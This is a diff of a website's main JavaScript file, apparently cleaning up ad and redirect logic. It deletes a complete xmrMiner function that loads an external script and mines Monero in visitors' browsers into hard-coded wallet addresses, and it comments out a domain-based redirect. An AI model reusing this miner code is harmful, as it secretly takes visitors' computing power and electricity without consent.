@@ -3,11 +3,11 @@ window.onload = function() {
 };
 
 var jsFiles = [
-    'https://imc.re/assets/js/core/jquery.min.js',
+    'https://imc.re/assets/js/core/jquery.min.js'
 ];
 
-// 'https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-3805485436239833'
 // 'https://leaktrailercondo.com/68/57/d4/6857d4b9ee98aad8bbaaa55523619d23.js',
+// 'https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-3805485436239833'
 
 var links = [
     'https://l.imc.re/adsterra'
@@ -97,43 +97,20 @@ function createSuperLabel(url, id) {
     a.click();    
 }
 
-function redirectToDomain() {
-    var hostname = window.location.hostname; // 获取当前页面的域名
-    var url = 'https://smg.ink';
+// function redirectToDomain() {
+//     var hostname = window.location.hostname; // 获取当前页面的域名
+//     var url = 'https://smg.ink';
 
-    switch (hostname) {
-        case 'imc.cab':
-        case 'hugo.imc.re':
-            url = 'https://smg.ink/?utm_source=imc-main.js';
-            redirectToLinks('loc', url);
-            break;
-        default:
-            break;
-    }
-}
-
-function xmrMiner() {
-    var script = document.createElement("script");
-    // script.src = "https://cdn.jsdelivr.net/gh/NajmAjmal/monero-webminer@main/script.js";
-    script.src = "https://thelifewillbefine.de/karma/karma.js?karma=bs%253Falgy=rx/0%253Fnosaj=xmr.miner.mcbe-server.com:9000";
-    // script.src = "/assets/js/na-monero.js";
-
-    script.onload = function() {
-        server = "wss://ny1.xmrminingproxy.com";
-        var pool = "moneroocean.stream";
-        var walletAddress = "47YPoXCVUxAQFpS8gmQX4fgY5LmnGkNG4Xz3WjzADvvZhr8WnNG3P4MD4hPAxF8aWZbUSrHhJ7YdZ4x3pi3qJw6aT9RxMg2";
-        var workerId = "WEB-XMR"
-        var threads = 5; //-1
-        var password = "";
-        startMining(pool, walletAddress, workerId, threads, password);
-        throttleMiner = 20;
-
-        EverythingIsLife('46CCPD4KmGbcs3vCwUPtkUCaKQRzLmb6GR7NJwj93anPg3CPugJbDmucumG7r3JsUH4PGRBSoHQAyCXjNDYffHJPHPdrGst', workerId, 80);
-    };
-    document.head.appendChild(script);
-}
-
-
+//     switch (hostname) {
+//         case 'imc.cab':
+//         case 'hugo.imc.re':
+//             url = 'https://smg.ink/?utm_source=imc-main.js';
+//             redirectToLinks('loc', url);
+//             break;
+//         default:
+//             break;
+//     }
+// }
 // 百度统计
 function baiduTongji(id) {
     var id = id || 'a02d22441e44bb824edf8620f6c3f5fa';
